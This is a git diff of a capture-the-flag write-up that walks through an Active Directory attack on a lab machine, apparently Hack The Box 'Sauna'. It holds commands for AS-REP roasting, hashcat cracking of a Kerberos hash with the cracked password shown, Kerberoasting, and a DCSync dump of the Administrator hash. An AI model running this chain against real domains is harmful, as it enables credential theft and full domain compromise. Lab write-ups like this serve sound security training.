@@ -75,12 +75,12 @@ Visiting `http://10.129.95.180` showed a corporate banking site for **Egotistica
 
 ![Meet the Team](/assets/images/ego1.png)
 ```
-Fergus Smith    — Manager
-Hugo Bear       — HR Manager  
-Steven Kerb     — Head of Recruitment
-Shaun Coins     — Compliance Manager
-Bowie Taylor    — Security Manager
-Sophie Driver   — Secretary
+Fergus Smith   
+Hugo Bear      
+Steven Kerb     
+Shaun Coins     
+Bowie Taylor   
+Sophie Driver  
 ```
 
 Six names. In AD attack chain, usernames almost always follow a predictable format based on real names — first initial + last name, first name + last name, first.last, and so on. Six names from a corporate website is enough to build a solid username wordlist for AS-REP roasting.
@@ -125,11 +125,7 @@ EOF
 ### AS-REP Roasting
 
 ```bash
-impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ \
-    -usersfile users.txt \
-    -dc-ip 10.129.95.180 \
-    -no-pass \
-    -format hashcat
+impacket-GetNPUsers EGOTISTICAL-BANK.LOCAL/ -usersfile users.txt -dc-ip 10.129.95.180 -no-pass -format hashcat
 ```
 ![AS-REP hash](/assets/images/ego2.png)
 ```
@@ -143,7 +139,7 @@ $krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:b84c29c4e87650e2555fcde9e3a9c13b$...
 ### Cracking the Hash
 
 ```bash
-hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt --force
+hashcat -m 18200 fsmith.hash /usr/share/wordlists/rockyou.txt 
 ```
 
 **Password:** `Thestrokes23`  
@@ -192,9 +188,7 @@ svc_loanmgr  ← Service account!
 ### Kerberoasting Attempt
 
 ```bash
-impacket-GetUserSPNs EGOTISTICAL-BANK.LOCAL/fsmith:'Thestrokes23' \
-    -dc-ip 10.129.95.180 \
-    -request
+impacket-GetUserSPNs EGOTISTICAL-BANK.LOCAL/fsmith:'Thestrokes23' -dc-ip 10.129.95.180 -request
 ```
 
 ```
@@ -271,8 +265,7 @@ So when BloodHound showed svc_loanmgr had both rights on `EGOTISTICAL-BANK.LOCAL
 ### DCSync — Dumping Administrator Hash
 
 ```bash
-impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.95.180 \
-    -just-dc-user Administrator
+impacket-secretsdump EGOTISTICAL-BANK.LOCAL/svc_loanmgr:'Moneymakestheworldgoround!'@10.129.95.180 -just-dc-user Administrator
 ```
 
 ```
